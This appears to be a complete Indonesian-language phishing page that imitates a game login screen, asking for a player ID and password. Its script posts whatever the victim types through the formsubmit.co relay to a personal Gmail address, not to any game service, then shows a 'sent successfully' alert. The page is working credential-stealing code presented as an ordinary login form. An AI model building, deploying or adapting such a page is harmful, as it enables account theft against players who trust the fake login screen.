<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: url('bg-login.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: Arial, sans-serif;
    }
    .form-wrapper {
      position: absolute;
      top: 58%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 260px;
    }
    input {
      width: 100%;
      margin-bottom: 15px;
      padding: 10px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
    }
    .submit-btn {
      background-color: transparent;
      border: none;
      width: 100%;
      height: 50px;
      position: absolute;
      bottom: 75px;
      left: 0;
      cursor: pointer;
    }
    form {
      position: relative;
    }
  </style>
</head>
<body>
  <div class="form-wrapper">
    <form id="loginForm">
      <input type="text" name="ID Pemain" placeholder="ID Pemain" required>
      <input type="password" name="Kata Sandi" placeholder="Kata Sandi" required>
      <button type="submit" class="submit-btn"></button>
    </form>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const formData = new FormData(this);
      const jsonData = {};
      formData.forEach((value, key) => {
        jsonData[key] = value;
      });

      fetch("https://formsubmit.co/ajax/gunawann8787@gmail.com", {
        method: "POST",
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(jsonData)
      })
      .then(response => response.json())
      .then(data => alert("Berhasil dikirim!"))
      .catch(error => alert("Gagal mengirim!"));
    });
  </script>
</body>
</html>
